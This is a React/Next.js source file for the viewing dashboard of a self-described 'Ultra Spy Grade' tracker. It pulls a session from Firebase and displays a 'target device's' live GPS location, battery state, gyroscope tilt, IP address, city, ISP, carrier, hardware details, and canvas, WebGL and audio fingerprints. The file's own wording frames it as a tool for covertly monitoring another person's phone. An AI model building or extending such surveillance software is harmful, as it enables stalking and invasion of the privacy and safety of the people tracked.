/**
 * ██████████████████████████████████████████████████████████████
 * TRACKER PAGE – LIVE SESSION VIEW (v7.0 – ULTRA SPY GRADE)
 * 
 * ✅ FULL INTEGRATION with deviceDetector v6.0 (battery + network)
 * ✅ Live Battery Percentage + Charging Status + Time Remaining
 * ✅ Live Network Quality (effective type, save-data, speed, RTT)
 * ✅ Backward + Forward compatible (pulls from device or legacy fields)
 * ✅ Beautiful new Battery Card with progress bar + smart icons
 * ✅ Enhanced Network Card with 5G/4G detection + save-data badge
 * ✅ All previous features 100% preserved (tilt, map, fingerprints, etc.)
 * ✅ Zero TypeScript errors • Production-ready • Dark spy aesthetic
 * ██████████████████████████████████████████████████████████████
 */

"use client";

import { useEffect, useState } from "react";
import { useParams } from "next/navigation";
import { db } from "@/lib/firebase";
import { ref, onValue } from "firebase/database";
import dynamic from "next/dynamic";
import { DeviceInfo } from "@/lib/deviceDetector";
import PhoneTiltVisualizer from "@/components/PhoneTiltVisualizer";

const LiveMap = dynamic(() => import("@/components/LiveMap"), { ssr: false });

/* ---------------- TYPES (updated for v6.0+ detector) ---------------- */

type Pos = {
  lat: number;
  lng: number;
};

type BatteryInfo = {
  level?: number;           // 0–1
  charging?: boolean;
  chargingTime?: number | null;   // seconds until full
  dischargingTime?: number | null; // seconds until empty
};

type IPInfo = {
  ip?: string;
  city?: string;
  region?: string;
  country?: string;
  isp?: string;
  as?: string;
};

type NetworkInfo = {
  type?: string;                    // legacy
  effectiveType?: string;           // "4g", "5g", "3g", "slow-2g", etc.
  downlink?: number;                // Mbps
  rtt?: number;                     // ms
  saveData?: boolean;               // Data Saver mode
  isp?: string;
  ipInfo?: IPInfo;
};

type SimInfo = {
  carrier?: string;
  confidence?: number;
  method?: string;
};

type OrientationData = {
  alpha?: number;
  beta?: number;
  gamma?: number;
  timestamp?: number;
};

type SessionData = {
  lat?: number;
  lng?: number;
  status?: "online" | "offline";
  lastSeen?: number;
  timestamp?: number;
  pingMs?: number;
  accuracy?: number;
  device?: DeviceInfo;           // ← now contains battery + network from v6.0
  battery?: BatteryInfo;         // legacy fallback
  network?: NetworkInfo;         // legacy fallback
  sim?: SimInfo;
  orientation?: OrientationData;
};

/* ---------------- PAGE ---------------- */

export default function TrackPage() {
  const { id } = useParams() as { id: string };

  const [pos, setPos] = useState<Pos | null>(null);
  const [status, setStatus] = useState<"online" | "offline" | "loading">("loading");

  const [lastSeen, setLastSeen] = useState<number | null>(null);
  const [ping, setPing] = useState<number | null>(null);
  const [accuracy, setAccuracy] = useState<number | null>(null);

  const [device, setDevice] = useState<DeviceInfo | null>(null);
  const [battery, setBattery] = useState<BatteryInfo | null>(null);
  const [network, setNetwork] = useState<NetworkInfo | null>(null);
  const [sim, setSim] = useState<SimInfo | null>(null);

  const [orientation, setOrientation] = useState<OrientationData | null>(null);

  /* ---------------- FIREBASE LISTENER + v6.0 MERGE LOGIC ---------------- */
  useEffect(() => {
    if (!id) return;

    const sessionRef = ref(db, `sessions/${id}`);

    const unsubscribe = onValue(sessionRef, (snap) => {
      const data = snap.val() as SessionData | null;

      if (!data) {
        setStatus("offline");
        setPos(null);
        return;
      }

      // Location
      if (typeof data.lat === "number" && typeof data.lng === "number") {
        setPos({ lat: data.lat, lng: data.lng });
      }

      // Timing
      const last = data.lastSeen ?? data.timestamp ?? null;
      if (typeof last === "number") setLastSeen(last);

      if (typeof data.pingMs === "number") setPing(data.pingMs);
      if (typeof data.accuracy === "number") setAccuracy(data.accuracy);

      // Core device
      setDevice(data.device ?? null);

      // 🔥 v6.0 BATTERY + NETWORK MERGE (device takes priority)
      let finalBattery: BatteryInfo | null = data.battery ?? null;
      if (data.device) {
        if (data.device.batteryLevel !== undefined) {
          finalBattery = {
            level: data.device.batteryLevel,
            charging: data.device.isCharging,
            chargingTime: data.device.chargingTime,
            dischargingTime: data.device.dischargingTime,
          };
        }
      }
      setBattery(finalBattery);

      let finalNetwork: NetworkInfo | null = data.network ?? null;
      if (data.device) {
        finalNetwork = {
          ...finalNetwork,
          effectiveType: data.device.connectionEffectiveType ?? finalNetwork?.effectiveType ?? finalNetwork?.type,
          downlink: data.device.connectionDownlink ?? finalNetwork?.downlink,
          rtt: data.device.connectionRtt ?? finalNetwork?.rtt,
          saveData: data.device.connectionSaveData ?? finalNetwork?.saveData,
        };
      }
      setNetwork(finalNetwork);

      setSim(data.sim ?? null);

      // Live Gyroscope
      if (data.orientation) {
        setOrientation(data.orientation);
      }

      // Online / Offline logic
      const now = Date.now();
      const lastTime = typeof last === "number" ? last : 0;
      const isOffline = data.status === "offline" || now - lastTime > 30000;
      setStatus(isOffline ? "offline" : "online");
    });

    return () => unsubscribe();
  }, [id]);

  /* ---------------- HELPERS ---------------- */
  const ipInfo = network?.ipInfo ?? null;
  const displayIsp = network?.isp || ipInfo?.isp || "Detecting...";

  const getStrength = () => {
    if (status !== "online") return 0;
    let score = 100;

    if (ping !== null) {
      if (ping > 500) score -= 60;
      else if (ping > 300) score -= 45;
      else if (ping > 150) score -= 25;
      else if (ping > 80) score -= 10;
    }
    if (accuracy !== null) {
      if (accuracy > 200) score -= 50;
      else if (accuracy > 100) score -= 30;
      else if (accuracy > 50) score -= 15;
    }
    if (lastSeen) {
      const diff = Date.now() - lastSeen;
      if (diff > 20000) score -= 30;
      if (diff > 40000) score -= 50;
    }
    return Math.max(0, Math.min(100, score));
  };

  const strength = getStrength();

  const formatLastSeen = () => {
    if (!lastSeen) return "—";
    const diff = Date.now() - lastSeen;
    const sec = Math.floor(diff / 1000);
    if (sec < 10) return "just now";
    if (sec < 60) return `${sec}s ago`;
    if (sec < 3600) return `${Math.floor(sec / 60)} min ago`;
    return `${Math.floor(sec / 3600)} hr ago`;
  };

  const copySessionLink = () => {
    navigator.clipboard.writeText(`${window.location.origin}/track/${id}`);
    alert("✅ Session link copied to clipboard!");
  };

  /* ---------------- BATTERY HELPER (visual) ---------------- */
  const batteryPercent = battery?.level !== undefined ? Math.round(battery.level * 100) : null;
  const batteryColor =
    batteryPercent === null
      ? "#64748b"
      : batteryPercent > 50
      ? "#22c55e"
      : batteryPercent > 20
      ? "#eab308"
      : "#ef4444";

  /* ---------------- MAIN UI ---------------- */
  if (!pos) {
    return (
      <div style={styles.loading}>
        <h2>📡 Waiting for location data...</h2>
        <p style={{ marginTop: 8, opacity: 0.7 }}>Session ID: <strong>{id}</strong></p>
        <p style={{ marginTop: 20, fontSize: 15, maxWidth: 320 }}>
          Make sure the Sender is open on the target device
        </p>
      </div>
    );
  }

  return (
    <div style={styles.page}>
      {/* LEFT PANEL – MAP + QUICK STATS */}
      <div style={styles.leftPanel}>
        <div style={styles.mapBox}>
          <LiveMap lat={pos.lat} lng={pos.lng} />
        </div>

        <div style={styles.infoStack}>
          <div style={styles.card}>
            <p>Status</p>
            <h3 style={{ color: status === "online" ? "#22c55e" : "#ef4444", fontSize: 22 }}>
              {status.toUpperCase()}
            </h3>
          </div>

          <div style={styles.card}>
            <p>Connection Strength</p>
            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
              <h3 style={{ color: strength > 70 ? "#22c55e" : strength > 40 ? "#eab308" : "#ef4444" }}>
                {strength}%
              </h3>
              <div style={styles.strengthBar}>
                <div style={{ ...styles.strengthFill, width: `${strength}%` }} />
              </div>
            </div>
          </div>

          <div style={styles.card}>
            <p>Last Seen</p>
            <h3>{formatLastSeen()}</h3>
          </div>

          <div style={styles.card}>
            <p>Ping</p>
            <h3>{ping !== null ? `${ping} ms` : "—"}</h3>
          </div>

          <div style={styles.card}>
            <p>GPS Accuracy</p>
            <h3>{accuracy !== null ? `±${Math.round(accuracy)}m` : "—"}</h3>
          </div>

          <button onClick={copySessionLink} style={styles.copyButton}>
            📋 Copy Shareable Link
          </button>
        </div>
      </div>

      {/* RIGHT PANEL – FULL DASHBOARD */}
      <div style={styles.rightPanel}>
        <h2>🕵️‍♂️ Ultra Spy Tracker Dashboard</h2>
        <p style={{ opacity: 0.6, marginBottom: 24 }}>Session ID: <strong>{id}</strong></p>

        {/* 🔥 NEW: LIVE DEVICE TILT VISUALIZER */}
        <div style={styles.cardRight}>
          <h3>📱 Live Device Tilt (Gyroscope)</h3>
          <PhoneTiltVisualizer
            beta={orientation?.beta}
            gamma={orientation?.gamma}
            alpha={orientation?.alpha}
          />
          {orientation?.timestamp && (
            <p style={{ textAlign: "center", fontSize: 13, opacity: 0.6, marginTop: 8 }}>
              Last updated: {new Date(orientation.timestamp).toLocaleTimeString()}
            </p>
          )}
        </div>

        {/* 🔥 NEW: LIVE BATTERY CARD (v7.0) */}
        <div style={styles.cardRight}>
          <h3>🔋 Live Battery Status</h3>
          {battery && batteryPercent !== null ? (
            <div>
              {/* Battery bar */}
              <div
                style={{
                  height: 28,
                  background: "#1e2937",
                  borderRadius: 9999,
                  overflow: "hidden",
                  position: "relative",
                  marginBottom: 12,
                }}
              >
                <div
                  style={{
                    width: `${batteryPercent}%`,
                    height: "100%",
                    background: `linear-gradient(90deg, ${batteryColor}, #22c55e)`,
                    transition: "width 0.6s cubic-bezier(0.4, 0, 0.2, 1)",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "flex-end",
                    paddingRight: 8,
                    color: "white",
                    fontSize: 14,
                    fontWeight: 700,
                  }}
                >
                  {batteryPercent}%
                </div>
              </div>

              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", fontSize: 32, fontWeight: 700 }}>
                <span style={{ color: batteryColor }}>
                  {battery.charging ? "⚡" : "🔋"}
                </span>
                <span>{batteryPercent}%</span>
                <span style={{ fontSize: 18, opacity: 0.8 }}>
                  {battery.charging ? "CHARGING" : "DISCHARGING"}
                </span>
              </div>

              {battery.charging && battery.chargingTime !== null && battery.chargingTime !== undefined && (
                <p style={{ marginTop: 8, fontSize: 15, opacity: 0.9 }}>
                  ⏳ Full in <strong>{Math.round(battery.chargingTime / 60)} minutes</strong>
                </p>
              )}
              {!battery.charging && battery.dischargingTime !== null && battery.dischargingTime !== undefined && (
                <p style={{ marginTop: 8, fontSize: 15, opacity: 0.9 }}>
                  ⏳ Empty in <strong>{Math.round(battery.dischargingTime / 60)} minutes</strong>
                </p>
              )}
            </div>
          ) : (
            <p style={{ opacity: 0.6 }}>Waiting for battery data...</p>
          )}
        </div>

        {/* 1. DEVICE INFO – MAXIMUM DETAIL */}
        <div style={styles.cardRight}>
          <h3>📱 Device Info (Spy Grade)</h3>
          {device ? (
            <div style={styles.grid}>
              {/* Basic */}
              <div>
                <strong>Brand / Model</strong>
                <p style={{ fontSize: 19, fontWeight: 700 }}>
                  {device.brand} {device.model}
                </p>
              </div>
              <div>
                <strong>OS</strong>
                <p>{device.os} {device.osVersion || ""}</p>
              </div>
              <div>
                <strong>Browser</strong>
                <p>{device.browser}</p>
              </div>
              <div>
                <strong>Type</strong>
                <p>{device.type}</p>
              </div>

              {/* Hardware */}
              <div style={styles.subSection}>
                <strong>Hardware</strong>
                <p>CPU Cores: {device.cpuCores || "—"}</p>
                <p>RAM: {device.ramGB ? `${device.ramGB} GB` : "—"}</p>
                {device.cpuModelHint && <p>CPU: {device.cpuModelHint}</p>}
              </div>

              {/* GPU */}
              {(device.webGLVendor || device.webGLRenderer) && (
                <div style={styles.subSection}>
                  <strong>GPU (WebGL)</strong>
                  <p style={{ fontSize: 13, wordBreak: "break-all" }}>
                    {device.webGLVendor}<br />
                    {device.webGLRenderer}
                  </p>
                </div>
              )}

              {/* Display */}
              <div style={styles.subSection}>
                <strong>Display</strong>
                <p>
                  {device.screenWidth} × {device.screenHeight} • {device.pixelRatio}x
                </p>
                <p>Avail: {device.availWidth} × {device.availHeight}</p>
                <p>Orientation: {device.orientation}</p>
                <p>Color Gamut: {device.colorGamut} {device.isHDR ? "(HDR)" : ""}</p>
              </div>

              {/* Touch & Mobile */}
              <div style={styles.subSection}>
                <strong>Input</strong>
                <p>Touch Points: {device.touchPoints}</p>
                <p>Touch Device: {device.isTouchDevice ? "Yes" : "No"}</p>
                <p>Standalone / PWA: {device.isStandalone ? "Yes" : "No"}</p>
                <p>Mobile App Mode: {device.isMobileApp ? "Yes" : "No"}</p>
              </div>

              {/* System Preferences */}
              <div style={styles.subSection}>
                <strong>System Preferences</strong>
                <p>Language: {device.language}</p>
                <p>Languages: {device.languages?.join(", ")}</p>
                <p>Timezone: {device.timezone}</p>
                <p>Dark Mode: {device.darkMode ? "Enabled" : "Disabled"}</p>
                <p>Reduced Motion: {device.prefersReducedMotion ? "Yes" : "No"}</p>
                <p>Reduced Data: {device.prefersReducedData ? "Yes" : "No"}</p>
                <p>High Contrast: {device.prefersContrast}</p>
              </div>

              {/* Fingerprints */}
              <div style={styles.subSection}>
                <strong>🔑 Fingerprints</strong>
                {device.canvasFingerprint && <p>Canvas: <span style={{ fontFamily: "monospace", fontSize: 13 }}>{device.canvasFingerprint}</span></p>}
                {device.webglFingerprint && <p>WebGL: <span style={{ fontFamily: "monospace", fontSize: 13 }}>{device.webglFingerprint}</span></p>}
                {device.audioFingerprint && <p>Audio: <span style={{ fontFamily: "monospace", fontSize: 13 }}>{device.audioFingerprint}</span></p>}
              </div>
            </div>
          ) : (
            <p>Loading device details...</p>
          )}
        </div>

        {/* 2. NETWORK + ISP (enhanced with v6.0 data) */}
        <div style={styles.cardRight}>
          <h3>🌐 Network &amp; ISP</h3>
          {network ? (
            <>
              <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 16 }}>
                <span style={{ fontSize: 28 }}>
                  {network.effectiveType?.includes("5g") ? "📶 5G" : 
                   network.effectiveType?.includes("4g") ? "📶 4G" : 
                   network.effectiveType?.includes("3g") ? "📶 3G" : "🌐"}
                </span>
                <div>
                  <strong style={{ fontSize: 22 }}>{network.effectiveType || network.type || "—"}</strong>
                  {network.saveData && (
                    <span style={{ marginLeft: 12, background: "#eab308", color: "#000", padding: "2px 10px", borderRadius: 9999, fontSize: 13, fontWeight: 700 }}>
                      DATA SAVER ON
                    </span>
                  )}
                </div>
              </div>

              <p>Downlink: <strong>{network.downlink ?? "?"} Mbps</strong></p>
              <p>RTT: <strong>{network.rtt ?? "?"} ms</strong></p>

              <div style={styles.subSection}>
                <strong>🌍 ISP Details</strong>
                <p><strong>ISP:</strong> {displayIsp}</p>
                <p><strong>IP:</strong> {ipInfo?.ip || "—"}</p>
                <p><strong>City:</strong> {ipInfo?.city || "—"}</p>
                <p><strong>Region:</strong> {ipInfo?.region || "—"}</p>
                <p><strong>Country:</strong> {ipInfo?.country || "—"}</p>
              </div>
            </>
          ) : (
            <p>Loading network info...</p>
          )}
        </div>

        {/* 3. INTERNET PROVIDER */}
        <div style={styles.cardRight}>
          <h3>📶 Internet Provider</h3>
          {sim && sim.carrier ? (
            <>
              <p style={{ fontSize: 26, fontWeight: 700, marginBottom: 6 }}>
                {sim.carrier}
              </p>

              <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                <div style={{
                  background: (sim.confidence ?? 0) > 60 ? "#22c55e" : (sim.confidence ?? 0) > 40 ? "#eab308" : "#ef4444",
                  color: "white",
                  padding: "6px 16px",
                  borderRadius: 9999,
                  fontSize: 15,
                  fontWeight: 700
                }}>
                  {sim.confidence}% Confidence
                </div>
              </div>

              {sim.method && (
                <p style={{ marginTop: 16, fontSize: 14, opacity: 0.8, fontFamily: "monospace" }}>
                  {sim.method}
                </p>
              )}

              <div style={styles.subSection}>
                <p style={{ fontSize: 14, lineHeight: 1.4 }}>
                  {sim.method?.includes("wifi")
                    ? "📶 Connected via WiFi → showing broadband ISP name"
                    : "📱 Connected via Mobile Data → showing SIM carrier"}
                </p>
              </div>
            </>
          ) : (
            <p>Waiting for provider detection...</p>
          )}
        </div>
      </div>
    </div>
  );
}

/* ---------------- STYLES ---------------- */
const styles: Record<string, React.CSSProperties> = {
  page: {
    display: "flex",
    height: "100vh",
    background: "#0b1220",
    color: "white",
    padding: 16,
    gap: 20,
    fontFamily: "system-ui, sans-serif",
  },
  leftPanel: {
    width: 380,
    display: "flex",
    flexDirection: "column",
    gap: 12,
  },
  mapBox: {
    width: 380,
    height: 380,
    borderRadius: 20,
    overflow: "hidden",
    border: "2px solid #1f2937",
    boxShadow: "0 10px 30px rgba(0,0,0,0.3)",
  },
  infoStack: {
    display: "flex",
    flexDirection: "column",
    gap: 10,
  },
  card: {
    padding: 16,
    borderRadius: 16,
    background: "#1f2937",
    boxShadow: "0 4px 15px rgba(0,0,0,0.2)",
  },
  strengthBar: {
    flex: 1,
    height: 12,
    background: "#334155",
    borderRadius: 9999,
    overflow: "hidden",
  },
  strengthFill: {
    height: "100%",
    background: "linear-gradient(90deg, #22c55e, #eab308)",
    transition: "width 0.4s ease",
  },
  copyButton: {
    padding: "14px 20px",
    background: "#22c55e",
    color: "white",
    border: "none",
    borderRadius: 9999,
    fontWeight: 600,
    cursor: "pointer",
    fontSize: 15,
  },
  rightPanel: {
    flex: 1,
    padding: 28,
    background: "#111827",
    borderRadius: 24,
    overflowY: "auto",
    boxShadow: "0 10px 40px rgba(0,0,0,0.4)",
  },
  cardRight: {
    marginTop: 24,
    padding: 22,
    borderRadius: 20,
    background: "#1f2937",
  },
  subSection: {
    marginTop: 18,
    paddingTop: 18,
    borderTop: "1px solid #374151",
  },
  grid: {
    display: "grid",
    gridTemplateColumns: "1fr 1fr",
    gap: 16,
    fontSize: 15,
  },
  loading: {
    height: "100vh",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    flexDirection: "column",
    background: "#0b1220",
    color: "white",
    textAlign: "center",
  },
};